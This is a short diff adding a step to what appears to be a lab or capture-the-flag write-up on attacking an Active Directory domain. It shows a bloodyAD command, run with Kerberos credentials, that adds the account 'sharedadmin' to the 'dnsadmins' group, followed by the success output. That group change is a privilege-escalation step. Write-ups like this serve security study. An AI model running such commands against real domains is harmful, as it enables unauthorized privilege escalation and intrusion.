@@ -663,5 +663,14 @@ Since im using kerberos becuase of the limitations of the protected users ill st
 export KRB5CCNAME=sharedadmin.ccache
 ```
 
+Then ill add the user to the group
+
+```python
+bloodyAD --host dc01.fragments.local -d fragments.local -k add groupMember 'dnsadmins' 'sharedadmin' 
+[+] sharedadmin added to dnsadmins
+```
+
+
+
 
 
